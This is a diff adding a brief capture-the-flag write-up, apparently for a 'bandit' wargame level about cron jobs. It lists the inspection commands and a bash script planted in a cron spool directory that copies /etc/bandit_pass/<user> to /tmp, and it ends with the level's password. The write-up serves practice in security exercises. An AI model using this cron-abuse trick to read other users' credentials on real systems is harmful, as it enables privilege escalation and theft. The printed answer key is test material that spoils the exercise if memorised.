@@ -1,0 +1,22 @@
+Task:
+    A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+    NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+    NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+Command:
+    vim /etc/cron.d/ # easier then ls to copy
+    vim /etc/cron.d/cronjob_bandit24
+    vim /usr/bin/cronjob_bandit24.sh # executes and deletes scripts
+    vim  /var/spool/bandit24/myscript.sh
+    chmod 777  /var/spool/bandit24/myscript.sh # make it executable
+
+
+Script:
+#!/bin/bash
+myname=$(whoami)
+cat /etc/bandit_pass/$myname > /tmp/my-blaa/the-answer-is-42.txt
+
+Password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
